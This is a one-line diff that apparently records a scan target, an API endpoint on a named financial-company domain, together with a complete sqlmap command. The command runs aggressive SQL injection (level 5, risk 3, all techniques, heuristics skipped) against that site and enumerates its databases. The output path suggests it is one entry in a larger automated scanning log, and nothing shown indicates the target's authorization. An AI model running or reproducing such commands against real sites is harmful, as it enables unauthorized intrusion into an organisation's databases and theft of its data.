@@ -1,0 +1,1 @@
+https://www.infinitycapital.bh/api/ (GET)  # /usr/bin/sqlmap -u https://www.infinitycapital.bh/api/ --batch --level=5 --risk=3 --dbs --threads=4 --output-dir=tool_outputs/ph/sm_9 -p id --technique=BEUSTQ --skip-heuristic
